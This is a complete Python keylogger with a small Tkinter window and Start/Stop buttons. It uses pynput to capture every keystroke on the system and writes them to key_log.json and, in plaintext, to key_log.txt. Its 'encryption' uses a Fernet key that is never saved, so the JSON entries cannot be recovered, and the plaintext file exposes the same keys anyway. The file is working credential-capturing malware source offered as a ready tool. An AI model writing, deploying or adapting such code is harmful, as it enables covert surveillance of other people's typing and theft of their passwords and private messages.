import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
from datetime import datetime
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Function to encrypt data
def encrypt_data(data):
    return cipher_suite.encrypt(data.encode()).decode()

# Function to decrypt data
def decrypt_data(data):
    return cipher_suite.decrypt(data.encode()).decode()

# Global variables
keys_used = []
flag = False
keys = ""

# Function to generate text log
def generate_text_log(key):
    with open('key_log.txt', "w+") as keys_file:
        keys_file.write(key)

# Function to generate JSON file with encrypted keys and timestamps
def generate_json_file(keys_used):
    with open('key_log.json', 'w') as key_log:
        for event in keys_used:
            event['timestamp'] = datetime.now().isoformat()
            if 'key' in event:
                event['key'] = encrypt_data(event['key'])
        key_list_json = json.dumps(keys_used, indent=4)
        key_log.write(key_list_json)

# Function to handle key press events
def on_press(key):
    global flag, keys_used, keys
    key_str = str(key).replace("'", "")
    if not flag:
        keys_used.append({'key': key_str, 'event': 'Pressed'})
        flag = True
    else:
        keys_used.append({'key': key_str, 'event': 'Held'})
    generate_json_file(keys_used)

# Function to handle key release events
def on_release(key):
    global flag, keys_used, keys
    key_str = str(key).replace("'", "")
    keys_used.append({'key': key_str, 'event': 'Released'})
    if flag:
        flag = False
    generate_json_file(keys_used)
    keys += key_str
    generate_text_log(keys)
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Function to start the keylogger
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.json'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

# Function to stop the keylogger
def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

# GUI setup
root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")
root.mainloop()
